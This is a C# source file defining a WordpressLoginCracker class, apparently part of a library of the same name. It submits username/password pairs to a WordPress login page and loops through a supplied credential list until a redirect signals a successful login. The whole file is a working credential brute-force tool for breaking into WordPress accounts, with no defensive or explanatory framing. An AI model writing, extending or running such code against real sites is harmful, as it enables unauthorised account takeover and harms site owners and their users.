using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Factories;
using Opapps.Lib.WordpressCracker.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Opapps.Lib.WordpressCracker.Services
{
    public class WordpressLoginCracker
    {
        private readonly HttpClient _httpClient;

        public WordpressLoginCracker()
        {
            _httpClient = HttpClientFactory.CreateDefaultHttpClient();
        }

        /// <summary>
        /// Create an object of this class with a custom <c>HttpClient</c> object. This is particularly useful to set a proxy, connection lifetime, etc.
        /// </summary>
        public WordpressLoginCracker(HttpClient httpClient)
        {
            _httpClient = httpClient;
        }

        /// <summary>
        /// Attempt to login to <paramref name="loginUrl"/> with <paramref name="loginCredential"/> using form-data authentication. 
        /// Returns true if it's a success, otherwise returns false.
        /// </summary>
        /// <param name="loginUrl">The WordPress login page URL. For example: https://example.com/wp-login.php</param>
        /// <param name="loginCredential">The login credential that contains username and password to attempt the login.</param>
        /// <returns></returns>
        public async Task<bool> AttemptLoginAsync(string loginUrl, FormData loginCredential)
        {
            var formContent = RequestParametersEncoder.GetFormUrlEncodedContentFrom(loginCredential.Username, loginCredential.Password);
            using HttpResponseMessage response = await _httpClient.PostAsync(loginUrl, formContent);
            return CheckLoginSuccess(response);
        }

        /// <summary>
        /// Attempt to login to <paramref name="loginUrl"/> with each of the <paramref name="loginCredentials"/> using form-data authentication. 
        /// Returns the successful <c>FormData</c> object if there is, otherwise returns null.
        /// </summary>
        /// <param name="loginUrl">The WordPress login page URL. For example: https://example.com/wp-login.php</param>
        /// <param name="loginCredentials">The login credentials that to attempt the login.</param>
        /// <returns></returns>
        public async Task<FormData?> AttemptLoginRangeAsync(string loginUrl, IEnumerable<FormData> loginCredentials) {
            FormData? correctLoginCredential = null;
            
            foreach(var loginCredential in loginCredentials)
            {
                bool isSuccess = await AttemptLoginAsync(loginUrl, loginCredential);

                if (isSuccess)
                {
                    correctLoginCredential = loginCredential;
                    break;
                }
            }

            return correctLoginCredential;
        }

        private bool CheckLoginSuccess(HttpResponseMessage response)
        {
            return (int) response.StatusCode == 302 || response.Headers.Location != null;
        }

        ~WordpressLoginCracker() {
            _httpClient.Dispose();
        }

    }
}
